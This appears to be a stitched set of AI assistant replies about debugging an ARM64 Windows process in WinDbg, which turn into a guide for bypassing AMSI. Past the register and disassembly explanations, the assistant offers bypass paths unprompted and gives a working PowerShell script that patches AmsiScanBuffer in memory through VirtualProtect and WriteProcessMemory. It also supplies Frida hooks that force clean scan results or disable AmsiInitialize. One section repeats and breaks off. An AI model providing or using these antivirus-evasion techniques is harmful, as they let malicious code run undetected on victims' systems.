     - ARM64 uses registers `x0` to `x7` to pass arguments to functions, and `x0` is also used to hold the return value of a function.

2. **Frame Pointer (`fp=000000f27729def0`)**:
   - This points to the base of the current stack frame, and is used for accessing local variables and previous stack frames.

3. **Link Register (`lr=00007fffed2665c8`)**:
   - The link register holds the return address after a function call. It will return execution to this address after the function completes. The value `00007fffed2665c8` points to the address where the function should return.

4. **Stack Pointer (`sp=000000f27729def0`)**:
   - This register holds the current position of the stack. It points to the memory location where the stack is currently being used.

5. **Program Counter (`pc=00007ff8bad44e30`)**:
   - This is the current instruction being executed. It points to the address `00007ff8bad44e30`, which corresponds to the disassembly you provided earlier (`pacibsp` instruction).

6. **Processor Status Register (`psr=60000000 -ZC- EL0`)**:
   - The **Processor Status Register** shows flags and the current exception level (EL).
     - `-Z-`: The **Zero (Z)** flag is set, which means the last comparison or arithmetic operation resulted in zero.
     - `-C-`: The **Carry (C)** flag is also set, indicating that an operation resulted in a carry out.
     - `EL0`: Execution Level 0, indicating this is user-mode execution.

### Context:
- **Arguments and state**: The values in `x0`, `x1`, etc., are typical of arguments passed to a function, as ARM64 uses these registers for function arguments. The other registers hold various values that may be part of the function’s context, such as saved variables, return addresses, and pointers to memory addresses.
- **Return address**: `lr=00007fffed2665c8` indicates where the function will return once complete.
- **Current instruction**: The program is currently executing at `pc=00007ff8bad44e30`, which corresponds to the `pacibsp` instruction in the disassembly provided earlier. This is the first instruction in a function prologue, where the program is setting up pointer authentication for the stack pointer.

This register dump would be useful in diagnosing a crash or understanding the current state of the program during debugging. You can analyze the values in the registers, compare them to expected states, and trace function execution using the program counter (`pc`) and link register (`lr`).

The `pc` (program counter) command you used shows the current instruction being executed, along with additional details about where the execution is at this moment. Here's an explanation of the components:

### Breakdown of the output:

1. **`amsi!AmsiScanBuffer+0xc0`**:
   - This indicates that the execution is currently inside the `AmsiScanBuffer` function from the **AMSI** (Anti-Malware Scan Interface) module. Specifically, the `+0xc0` offset (192 bytes) into the function.
   - `AmsiScanBuffer` is a key function used by Windows Defender (and other AV engines) to scan memory buffers for malware. This function is often targeted by malware for bypass attempts.
   
2. **`00007ff8`bad44ef0**:
   - This is the memory address of the current instruction being executed, located in the `AmsiScanBuffer` function.

3. **`d63f0220 blr xip1`**:
   - This is the ARM64 machine instruction at the current program counter.
     - `blr`: This is a "branch with link" instruction, which jumps to the address stored in `xip1` while also saving the return address in the link register (`lr`). In this case, it jumps to another function, presumably `ntdll!LdrpValidateUserCallTarget`.
     - `xip1`: The `xip1` register contains the target address of the branch instruction. It seems like `xip1` holds the address of `ntdll!LdrpValidateUserCallTarget` (located at `00007ff8`dd1124c0).
   
4. **`ntdll!LdrpValidateUserCallTarget (00007ff8`dd1124c0)`**:
   - This indicates the branch is jumping to `ntdll!LdrpValidateUserCallTarget`, a function in the `ntdll.dll` module.
   - `LdrpValidateUserCallTarget` is a function within the **NTDLL** (Windows NT Layer DLL) that validates whether a user-mode address is safe to call as a target for certain system operations.

### Context:

- **AMSI Scan Buffer**: `AmsiScanBuffer` is a critical function used by AMSI to scan memory for malicious patterns. If a malicious buffer is detected, AMSI can flag the content, allowing Windows Defender or other antivirus solutions to take action.
- **Branch to NTDLL**: The `blr` instruction is calling `LdrpValidateUserCallTarget` from the `ntdll.dll` module, likely part of validating or securing the operation being performed in `AmsiScanBuffer`.

### Why This is Interesting:
- **Bypassing AMSI**: Attackers often attempt to bypass or manipulate the `AmsiScanBuffer` function to execute malicious code without triggering antivirus or malware detection. The presence of this function in your trace suggests you might be working on or analyzing code that interacts with AMSI, possibly exploring how it can be bypassed or exploited.
- **Control Flow Validation**: `LdrpValidateUserCallTarget` suggests that Windows is validating the safety of a call target, ensuring that the program is not jumping to an unexpected or unauthorized location—likely part of security checks to prevent exploitation.

In summary, the code is currently executing within the `AmsiScanBuffer` function and is about to branch to a validation function in `ntdll.dll`. This could be part of the normal security operations performed by AMSI and Windows to check for malware.

Given the current context, where the program is executing within the **`AmsiScanBuffer`** function and preparing to jump to **`ntdll!LdrpValidateUserCallTarget`**, here's what I'd do next based on various investigative and attack scenarios:

### 1. **Memory Inspection for AMSI Bypass:**
   If your goal is to explore or bypass AMSI (Anti-Malware Scan Interface), this is a critical point in execution. AMSI functions are frequently targeted by attackers to allow malicious code execution without being flagged by antivirus software.

   **Steps:**
   - **Inspect the contents of memory and registers**:
     - Check what is being passed into `AmsiScanBuffer`. Use `db` (Display Memory) or `dt` (Display Type) commands to dump the contents of the buffers (`x0` or `x1`) to examine what AMSI is trying to scan.
     - Example: `dt -r amsi!AmsiScanBuffer` to see the data structure of `AmsiScanBuffer`.

   - **Check for potential hooks or patches**:
     - Investigate if `AmsiScanBuffer` or any related function has been tampered with, potentially by malware. 
     - Example: Use `u 00007ff8bad44ef0` to disassemble and verify the function's integrity.

   - **Explore patches for AMSI bypass**:
     - Some AMSI bypass methods involve patching specific parts of the `AmsiScanBuffer` function (e.g., skipping the actual scanning). You can dump and modify memory at runtime to see how bypasses are working.
     - Example: Try overwriting return values in registers or modify jumps that handle malware detection within AMSI.

### 2. **Validate Control Flow:**
   Since the instruction pointer is moving to **`LdrpValidateUserCallTarget`**, it's worth examining what validation is happening next.

   **Steps:**
   - **Step into the next instruction**:
     - Use `t` (step into) to execute the branch instruction (`blr xip1`) and step into `LdrpValidateUserCallTarget`. Analyze its behavior.
     - Example: `t` followed by `u @rip` to disassemble the target function.

   - **Examine control flow**:
     - Check if the `LdrpValidateUserCallTarget` function is validating expected call targets. Look for any pointers being checked or verified, and determine if this is related to an exploit mitigation (like Control Flow Guard).

### 3. **Investigate the Arguments to LdrpValidateUserCallTarget:**
   It may be interesting to see what arguments are being passed to `LdrpValidateUserCallTarget` to better understand what it's validating. You can print the arguments passed in `x0`, `x1`, etc.

   **Steps:**
   - **Check the registers** before and after the call:
     - The branch instruction (`blr xip1`) indicates a function call, and arguments are passed in registers `x0`, `x1`, etc.
     - Example: `r x0` or `r x1` to see the values of the arguments.

   - **Log and analyze return values**:
     - After calling `LdrpValidateUserCallTarget`, examine the return values in the `x0` register, as it might indicate success or failure of the validation.

### 4. **Monitor AMSI Behavior and Explore Bypass Techniques:**
   If you're testing AMSI bypass techniques, you can attempt to manipulate the behavior of the `AmsiScanBuffer` function or find a way to avoid AMSI scans altogether.

   **Steps:**
   - **Use Mimikatz or similar tools** to directly modify AMSI's behavior (such as in-memory patches).
   - **Try alternative bypass techniques**:
     - Memory patching of `AmsiScanBuffer` (like returning a false negative).
     - **PowerShell-based bypasses**: Techniques that modify AMSI's .NET objects to evade detection.

### 5. **Trace and Monitor Calls**:
   If you're reverse-engineering or debugging a crash, follow the call stack to see what led to this point. Use `kb` to get a backtrace of the calls leading to `AmsiScanBuffer`.

   **Steps:**
   - **Check the call stack** using `kb` or `k` to identify what series of calls or operations triggered the AMSI scan.
   - **Step back and inspect arguments**: Follow the function trail backward to understand how AMSI was invoked and if it can be influenced earlier in the call chain.

### Conclusion:
Your next step depends on your goal:
- If you're exploring AMSI bypasses, inspect the buffers passed to `AmsiScanBuffer`, step into the `LdrpValidateUserCallTarget`, and check the validation process. Explore memory patching techniques to bypass AMSI.
- If you're debugging or reverse engineering, follow the call stack backward, inspect the program flow, and investigate what triggered the scan.

Would you like to focus on bypassing AMSI, or is the goal more on reverse engineering/debugging?

Here's a breakdown of the disassembly:

```
amsi!AmsiScanBuffer+0xc0:
00007ff8`bad44ef0 d63f0220 blr         xip1            ; Branch to the address stored in xip1 (could be a function call or a jump)
00007ff8`bad44ef4 d63f01e0 blr         x15             ; Branch to the address stored in x15 (another indirect branch)
00007ff8`bad44ef8 14000002 b           amsi!AmsiScanBuffer+0xd0 ; A branch forward within the function, likely a small jump
00007ff8`bad44efc 180000e0 ldr         w0,amsi!AmsiScanBuffer+0xe8 ; Load the value at address +0xe8 into register w0
00007ff8`bad44f00 a8c47bfd ldp         fp,lr,[sp],#0x40 ; Load fp (frame pointer) and lr (link register) from the stack, adjust sp by 0x40
00007ff8`bad44f04 a9426bf9 ldp         x25,x26,[sp,#0x20] ; Load registers x25 and x26 from stack
00007ff8`bad44f08 a9415bf5 ldp         x21,x22,[sp,#0x10] ; Load registers x21 and x22 from stack
00007ff8`bad44f0c a8c353f3 ldp         x19,x20,[sp],#0x30 ; Load registers x19 and x20 from stack
```

### What does this mean?

1. **`blr xip1` and `blr x15`**: These are indirect branches, meaning the program will jump to the addresses stored in the `xip1` and `x15` registers, respectively. These branches likely indicate either calls to functions or transitions to code dynamically loaded or resolved at runtime.

2. **`b amsi!AmsiScanBuffer+0xd0`**: This is a relative branch instruction jumping a short distance within the function, likely part of the control flow (e.g., skipping over some code).

3. **Stack unwinding (ldp instructions)**: The sequence of `ldp` instructions is restoring the state of registers (like `x19` to `x26`) and the frame pointer (`fp`) and link register (`lr`) from the stack. This suggests that the function is close to its return point and is cleaning up before exiting.

### What does this tell us?

This section of code is nearing the end of the `AmsiScanBuffer` function. The critical points here are:
- **The indirect branches (`blr xip1` and `blr x15`)** could potentially be interesting points to inspect. These might be key locations where the program jumps to another part of code, possibly as part of scanning or analyzing a buffer.
- The stack operations indicate this function is about to return after completing its execution.

### Next Steps:
1. **Check the targets of `xip1` and `x15`**:
   - Examine the values in these registers to see where the program is branching. This will tell us more about what happens next.
   - You can use `r xip1` and `r x15` to inspect their values.
   
2. **Set breakpoints**:
   - Set breakpoints on the next instructions after these branches to step into the code that's being called indirectly. For example, you could break after the `blr xip1` to see what happens next.

3. **Modify return values**:
   - Depending on your goal, you could modify the return value of the `AmsiScanBuffer` function (which is stored in `x0`). If you’re looking to bypass AMSI, you could experiment by forcing `x0` to return a value that indicates no malware was detected.

Would you like to proceed by investigating the values of `xip1` and `x15`?


To dynamically patch the return value of **`AmsiScanBuffer`** by setting the **`w0`** register to `0` directly from **PowerShell** on an **ARM64** system, you can modify the in-memory code of **`amsi.dll`**. Specifically, you'd use **PowerShell** to locate and patch the target address so that the function always returns `0`.

Here’s a way to dynamically patch `AmsiScanBuffer` to set **`w0 = 0`** using PowerShell. The patch replaces the part of the `ScanBuffer` function that sets the result with a simple instruction to set `w0 = 0`, effectively bypassing the AMSI scan.

### General Approach

1. **Locate `AmsiScanBuffer` in Memory**.
2. **Write New Assembly Instruction** to force the `w0` register to `0`.
3. **Patch Memory** in the running process using PowerShell.

### Step-by-Step Method

#### 1. **Locate the Address of `AmsiScanBuffer`**
First, you need to locate the memory address of `AmsiScanBuffer` inside `amsi.dll`. In PowerShell, you can use `Get-Process` and `System.Diagnostics` to locate loaded modules.

```powershell
# Get the address of the loaded amsi.dll module in PowerShell
$process = [System.Diagnostics.Process]::GetProcessesByName("powershell")[0]
$amsiModule = $process.Modules | Where-Object { $_.ModuleName -like "amsi.dll" }
$amsiBaseAddress = $amsiModule.BaseAddress

# Confirm the base address
$amsiBaseAddress
```

Next, you'll need to calculate the offset of `AmsiScanBuffer` within the loaded `amsi.dll`. This requires you to either know the offset from debugging or disassembly.

#### 2. **Patch the Memory**
You can use the **VirtualProtect** API to modify the protection of memory pages, allowing you to write to them. You can then patch `AmsiScanBuffer` by replacing the instruction with an instruction that sets `w0 = 0` (which corresponds to **ARM64 assembly**).

Here is a PowerShell script to modify the memory:

```powershell
# Import necessary methods for memory patching
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MemPatch
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesWritten);
    
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}
"@

# Open the process
$pid = $process.Id
$hProcess = [MemPatch]::OpenProcess([MemPatch]::PROCESS_ALL_ACCESS, $false, $pid)

# Calculate the address of AmsiScanBuffer
# You need to calculate the offset of AmsiScanBuffer within amsi.dll
$amsiScanBufferOffset = 0x4e30  # This is the offset, modify as needed
$amsiScanBufferAddress = [IntPtr]::Add($amsiBaseAddress, $amsiScanBufferOffset)

# Change memory protection to allow writing
$oldProtect = 0
[MemPatch]::VirtualProtect($amsiScanBufferAddress, [UIntPtr]4, [MemPatch]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

# Patch the instruction (mov w0, #0 in ARM64)
# This is the equivalent ARM64 opcode for "mov w0, #0"
$patch = @(0x00, 0x00, 0x80, 0x52)  # mov w0, #0 instruction for ARM64

# Write the patch
$bytesWritten = [IntPtr]::Zero
[MemPatch]::WriteProcessMemory($hProcess, $amsiScanBufferAddress, $patch, [UIntPtr]4, [ref]$bytesWritten)

# Restore original memory protection
[MemPatch]::VirtualProtect($amsiScanBufferAddress, [UIntPtr]4, $oldProtect, [ref]$oldProtect)

"Successfully patched AmsiScanBuffer!"
```

### Explanation:

1. **Open the Process**: We open the PowerShell process to gain access to its memory using the `OpenProcess` API with full access rights (`PROCESS_ALL_ACCESS`).
   
2. **Locate `AmsiScanBuffer`**: The base address of `amsi.dll` is found, and we calculate the address of the `AmsiScanBuffer` function using its known offset (`0x4e30` in this example). You’ll need to confirm this offset using debugging or reverse engineering.

3. **Change Memory Protection**: We use `VirtualProtect` to change the memory protection of the `AmsiScanBuffer` memory page to `PAGE_EXECUTE_READWRITE`, allowing us to modify the memory.

4. **Patch the Function**: We overwrite the beginning of `AmsiScanBuffer` with the ARM64 opcode for `mov w0, #0`, which forces the function to always return `S_OK`.

5. **Restore Memory Protection**: After the patch, the original memory protection is restored.

### Notes:
- **Offset of `AmsiScanBuffer`**: The offset `0x4e30` used here is just an example. You’ll need to confirm the correct offset for the version of `amsi.dll` you are working with on the ARM64 build.
  
- **ARM64 Instructions**: The patch uses the instruction `mov w0, #0` encoded as `0x00, 0x00, 0x80, 0x52`, which sets the `w0` register to `0`, signaling that the scan buffer is clean.

### Testing the Patch:

Once you've run this script, try running some PowerShell commands or scripts that would normally trigger an AMSI scan. If successful, AMSI should now be bypassed, and your scripts should run without interference from Windows Defender.

Let me know if this works for your setup or if you need more detailed help on specific steps!

To find the **offset** for the `w0` register manipulation within **`AmsiScanBuffer`**, you'll need to disassemble the **`amsi.dll`** module to locate the exact position where the function sets the return value in **`w0`**. Here's how you can do it:

### 1. **Load `amsi.dll` in a Debugger (WinDbg or Ghidra/IDA Pro)**

#### Using WinDbg:

If you're using **WinDbg** and have already set a breakpoint on `AmsiScanBuffer`, you can step through the function to find where **`w0`** is set. Here’s how to identify the instruction responsible for setting `w0`:

1. **Set a Breakpoint**:
   After loading **`amsi.dll`**, set a breakpoint at `AmsiScanBuffer`.
   
   ```bash
   bp amsi!AmsiScanBuffer
   ```

2. **Step Through** the Instructions:
   Once you hit the breakpoint, step through the function using the `t` (step) command:
   
   ```bash
   t
   ```

   Watch for where the **`w0`** register is set. You're looking for an instruction that moves or sets a value into **`w0`**. This is likely near the end of the function, but it depends on how `AmsiScanBuffer` is implemented.

   On ARM64, an instruction to set `w0` would look like this:
   ```assembly
   mov w0, #<value>
   ```

3. **Record the Offset**:
   Once you find the instruction that modifies **`w0`**, calculate the offset of that instruction from the base address of `amsi.dll`. You can calculate the offset by subtracting the base address of `amsi.dll` from the instruction address.

   For example:
   - Base Address of `amsi.dll`: `00007ff8bad40000`
   - Address of `mov w0, #0`: `00007ff8bad44e38`
   
   Offset: `00007ff8bad44e38 - 00007ff8bad40000 = 0x4e38`.

#### Using IDA Pro or Ghidra:

Alternatively, if you prefer static analysis tools like **IDA Pro** or **Ghidra**, you can disassemble `amsi.dll` and directly find the `AmsiScanBuffer` function:

1. **Open `amsi.dll` in IDA Pro/Ghidra**:
   - Load `amsi.dll` into IDA Pro or Ghidra.
   - Locate the `AmsiScanBuffer` function by browsing the list of functions or searching for it.

2. **Find the `mov w0` Instruction**:
   - Once you locate `AmsiScanBuffer`, look for the instruction where **`w0`** is set to the return value. This could be a conditional assignment depending on the outcome of the scan.

3. **Determine the Offset**:
   - IDA Pro or Ghidra will display the offsets within the function. Find the offset of the `mov w0, #0` instruction and use that as the target for your patch.

---

### 2. **Patching `AmsiScanBuffer` with PowerShell**

Once you know the exact offset where **`w0`** is modified, you can modify your PowerShell patching script to target that specific address and insert the following ARM64 instruction:

- **`mov w0, #0`** (encoded as `0x00, 0x00, 0x80, 0x52` in ARM64 assembly).

Update your PowerShell patching script to write the patch at the correct offset.

---

### Example:

Let’s say you identified that the `mov w0, #0` instruction should be at offset `0x4e38`. Here’s how you would modify the PowerShell script:

1. Calculate the address of `AmsiScanBuffer`:
   ```powershell
   $amsiScanBufferAddress = [IntPtr]::Add($amsiBaseAddress, 0x4e38)
   ```

2. Patch the memory:
   ```powershell
   $patch = @(0x00, 0x00, 0x80, 0x52)  # mov w0, #0 for ARM64
   ```

Now when the patch is applied, `AmsiScanBuffer` will always return `S_OK` (`0`), indicating that no threat was detected.

---

### Summary:
1. **Disassemble `amsi.dll`** using **WinDbg** or a static analysis tool like **IDA Pro** or **Ghidra**.
2. **Find the `w0` instruction** (likely near the end of `AmsiScanBuffer`).
3. **Calculate the offset** of the `mov w0` instruction from the base address of `amsi.dll`.
4. **Patch the memory** at that offset using PowerShell to set `w0 = 0`.

This approach ensures that AMSI will be bypassed dynamically by modifying its return value. Let me know if you need help with specific details!

To find the **offset** for the `w0` register manipulation within **`AmsiScanBuffer`**, you'll need to disassemble the **`amsi.dll`** module to locate the exact position where the function sets the return value in **`w0`**. Here's how you can do it:

### 1. **Load `amsi.dll` in a Debugger (WinDbg or Ghidra/IDA Pro)**

## Frida

To use **Frida** for analyzing and potentially bypassing **AMSI** in **PowerShell** (or any other application that interfaces with **AMSI**), you'll need to follow a few steps to:

1. **Inject a Frida script** into the PowerShell process or another target process.
2. **Hook into specific AMSI-related functions** like `AmsiScanBuffer` to analyze, modify, or bypass it dynamically.
3. **Intercept and potentially modify AMSI's behavior** to prevent scans or return clean results.

Frida is powerful because it allows dynamic instrumentation of running processes, making it possible to bypass protections like AMSI without needing to modify the underlying binary or use a debugger like **WinDbg**.

### Steps to Use Frida to Analyze or Bypass AMSI

### 1. **Install Frida**
First, install Frida on your system. You can install Frida using **pip** (Python's package manager):

```bash
pip install frida-tools
```

This installs both the Frida core and the **Frida CLI tools**.

### 2. **Identify the Target Process**
If you want to analyze **PowerShell** and its use of AMSI, you'll need to find the **PowerShell process** running on your machine.

You can list all processes using:

```bash
ps aux | grep powershell  # For Linux/macOS
tasklist                 # For Windows CMD
Get-Process              # For Windows PowerShell
```

Find the **Process ID (PID)** of the **PowerShell** instance you're interested in.

### 3. **Write a Frida Script to Hook AMSI Functions**
Frida allows you to hook into functions in a process and analyze or modify their behavior. In this case, you can hook into **`AmsiScanBuffer`**, which is the function used by AMSI to scan content.

Here’s an example Frida script that hooks **`AmsiScanBuffer`** in `amsi.dll`:

```javascript
// AMSI bypass with Frida
Interceptor.attach(Module.findExportByName("amsi.dll", "AmsiScanBuffer"), {
    onEnter: function (args) {
        // Log the buffer being scanned and its length
        console.log("[+] AmsiScanBuffer called");
        console.log("Buffer pointer: " + args[1]);
        console.log("Buffer length: " + args[2].toInt32());
    },
    onLeave: function (retval) {
        // Change the return value to AMSI_RESULT_CLEAN (0)
        console.log("Original return value: " + retval);
        retval.replace(0); // AMSI_RESULT_CLEAN
        console.log("[+] Return value replaced with 0 (AMSI_RESULT_CLEAN)");
    }
});
```

This Frida script hooks into `AmsiScanBuffer` and does the following:
- **Logs information** about the buffer being scanned (useful for analysis).
- **Modifies the return value** of `AmsiScanBuffer` to always return `0` (clean scan), which bypasses AMSI.

### 4. **Inject the Frida Script into the Target Process**

You can use the **Frida CLI** to inject your script into the running **PowerShell** process (or any other process that loads `amsi.dll`).

Here’s how you inject the script:

```bash
frida -p <PID> -l amsi_bypass.js --no-pause
```

- Replace `<PID>` with the Process ID of the PowerShell process.
- `amsi_bypass.js` is the name of the Frida script that contains the hooking logic.

### 5. **Test the Bypass**
Once you inject the Frida script, any AMSI scan should now be intercepted. **`AmsiScanBuffer`** will always return `0` (AMSI_RESULT_CLEAN), meaning that AMSI will no longer flag any content as malicious.

You can test this by running a PowerShell script that would normally trigger AMSI, such as:

```powershell
Invoke-Expression -Command "malicious_code_here"
```

If AMSI is successfully bypassed, the code will run without being blocked by Windows Defender or other security software.

### 6. **Modify the Script for Deeper Analysis**

If you're more interested in **analyzing AMSI** than bypassing it, you can modify the Frida script to log more detailed information about the buffer being scanned or even dump the contents of the buffer for further analysis.

For example, to print the contents of the buffer:

```javascript
Interceptor.attach(Module.findExportByName("amsi.dll", "AmsiScanBuffer"), {
    onEnter: function (args) {
        var buffer = Memory.readUtf8String(args[1], args[2].toInt32());
        console.log("[+] Buffer content being scanned: " + buffer);
    },
    onLeave: function (retval) {
        console.log("Original return value: " + retval);
    }
});
```

This logs the actual content being scanned by AMSI, which could be useful if you’re trying to see what specific content AMSI is flagging.

### 7. **Bypass AMSI Initialization in PowerShell (Optional)**

You can also hook into **AMSI initialization functions** (like `AmsiInitialize` or `AmsiOpenSession`) to prevent AMSI from initializing in the first place. This would prevent any AMSI-related scans from occurring.

```javascript
Interceptor.attach(Module.findExportByName("amsi.dll", "AmsiInitialize"), {
    onLeave: function (retval) {
        console.log("[+] AmsiInitialize called, disabling AMSI...");
        retval.replace(0);  // Disable AMSI initialization
    }
});
```

This script would prevent **AMSI** from initializing correctly by modifying the return value of `AmsiInitialize`, effectively disabling AMSI for the entire session.

### 8. **Automating the Injection with Frida**

If you want to automate the Frida injection and bypass process, you can write a small Python or Bash script that automatically attaches Frida to the PowerShell process and injects the AMSI bypass script. This way, the process is fully automated whenever you start PowerShell.

### Summary of Commands:

1. **Find the PowerShell Process ID**:
   ```bash
   tasklist | findstr powershell
   ```

2. **Inject the Frida Script**:
   ```bash
   frida -p <PID> -l amsi_bypass.js --no-pause
   ```

3. **Frida Script Example (amsi_bypass.js)**:
   ```javascript
   Interceptor.attach(Module.findExportByName("amsi.dll", "AmsiScanBuffer"), {
       onEnter: function (args) {
           console.log("[+] AmsiScanBuffer called");
       },
       onLeave: function (retval) {
           retval.replace(0);  // Force AMSI_RESULT_CLEAN
       }
   });
   ```

### Final Thoughts:
Frida is an excellent tool for **dynamic analysis and instrumentation**. By hooking into **AMSI functions** like `AmsiScanBuffer`, you can control how AMSI operates, inspect the data it scans, and even bypass it entirely without needing to modify binaries or run a traditional debugger like WinDbg.
